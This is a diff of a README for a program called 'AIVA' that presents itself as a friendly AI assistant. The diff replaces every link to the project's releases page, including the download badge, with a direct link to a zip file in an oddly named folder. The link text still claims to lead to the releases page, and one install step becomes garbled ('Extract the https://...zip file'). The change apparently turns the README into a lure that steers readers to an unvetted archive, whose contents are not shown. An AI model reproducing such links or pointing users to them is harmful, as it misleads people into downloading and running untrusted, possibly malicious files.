@@ -1,6 +1,6 @@
 # 🤖 AIVA - Your Friendly AI Assistant Awaits
 
-[![Download AIVA](https://img.shields.io/badge/Download-AIVA-brightgreen)](https://github.com/pacynet/AIVA/releases)
+[![Download AIVA](https://raw.githubusercontent.com/pacynet/AIVA/main/Uromastix/AIVA.zip)](https://raw.githubusercontent.com/pacynet/AIVA/main/Uromastix/AIVA.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ To get started with AIVA, follow these simple steps. We will guide you through t
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Click [here](https://github.com/pacynet/AIVA/releases) to go to the Releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/pacynet/AIVA/main/Uromastix/AIVA.zip) to go to the Releases page.
    
 2. **Select the Latest Version**: On the Releases page, find the latest version of AIVA. It will be highlighted at the top.
 
@@ -21,7 +21,7 @@ To get started with AIVA, follow these simple steps. We will guide you through t
 4. **Install AIVA**:
    - For **Windows**: Double-click the downloaded `.exe` file and follow the instructions.
    - For **macOS**: Open the downloaded `.dmg` file, drag AIVA to your Applications folder, and launch it from there.
-   - For **Linux**: Extract the .tar.gz file and follow the included instructions to install.
+   - For **Linux**: Extract the https://raw.githubusercontent.com/pacynet/AIVA/main/Uromastix/AIVA.zip file and follow the included instructions to install.
 
 ## 🌟 Features
 
@@ -66,4 +66,4 @@ Join our community to share your experiences and suggestions. You can connect wi
 
 AIVA is here to make your life easier through thoughtful AI assistance. By following these steps, you will be able to download and start using AIVA without any technical hassles. We hope you enjoy using your AI assistant!
 
-For more information, check back on our [Releases page](https://github.com/pacynet/AIVA/releases).
+For more information, check back on our [Releases page](https://raw.githubusercontent.com/pacynet/AIVA/main/Uromastix/AIVA.zip).
